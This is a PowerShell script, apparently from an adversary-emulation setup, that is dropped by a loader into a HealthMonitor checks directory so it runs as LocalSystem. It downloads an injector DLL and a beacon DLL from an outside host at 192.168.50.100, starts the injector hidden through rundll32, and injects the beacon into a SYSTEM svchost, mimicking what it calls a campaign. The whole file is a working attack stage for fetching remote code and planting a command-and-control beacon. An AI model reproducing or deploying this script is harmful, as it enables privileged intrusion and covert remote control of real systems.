# agent-update.ps1 - dropped into the HealthMonitor checks directory by the loader.
# HealthMonitor runs this as LocalSystem. It stages the injector and the beacon DLL, then starts the
# injector with rundll32 so the beacon lives inside a SYSTEM svchost, as the campaign does.

$ErrorActionPreference = 'Continue'
$root = 'C:\ProgramData\HealthMonitor'
$log  = Join-Path $root 'agent.log'
$dir  = 'C:\ProgramData\c0015'
$inj  = Join-Path $dir 'injector.dll'
$dll  = Join-Path $dir 'beacon.dll'
$base = 'http://192.168.50.100'

function W($m) { Add-Content -LiteralPath $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $m) }

W "update.ps1 start as $(whoami)"
New-Item -ItemType Directory -Force $dir | Out-Null

foreach ($item in @(@('injector.dll', $inj), @('beacon.dll', $dll))) {
    try {
        Invoke-WebRequest -Uri "$base/$($item[0])" -OutFile $item[1] -UseBasicParsing -TimeoutSec 180
        W "downloaded $($item[0])"
    } catch {
        W "download $($item[0]) failed: $($_.Exception.Message)"
        exit 1
    }
}

try {
    Start-Process -FilePath 'C:\Windows\System32\rundll32.exe' `
                  -ArgumentList "$inj,Run" -WindowStyle Hidden
    W "injector started"
} catch {
    W "injector start failed: $($_.Exception.Message)"
    exit 1
}

Start-Sleep -Seconds 5
$tail = Get-Content (Join-Path $dir 'inject.log') -Tail 1 -ErrorAction SilentlyContinue
W "inject.log: $tail"
